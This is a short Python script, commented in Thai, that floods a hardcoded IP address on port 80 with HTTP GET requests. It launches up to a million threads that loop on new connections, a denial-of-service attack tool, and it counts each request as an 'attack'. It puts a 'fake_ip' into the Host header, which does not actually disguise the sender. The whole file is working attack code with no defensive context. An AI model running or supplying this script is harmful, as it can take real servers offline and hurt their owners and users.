import socket
import threading

target = '202.28.1.60'
fake_ip = '182.21.20.32'
port = 80 
attack_num = 0
lock = threading.Lock()

def attack():
    global attack_num
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

            with lock:
                attack_num += 1
                print(f"Attack number: {attack_num}")

        except Exception as e:
            print(f"Error: {e}")
            break

# สร้างเธรดสำหรับการโจมตี
for i in range(1000000):
    thread = threading.Thread(target=attack)
    thread.start()
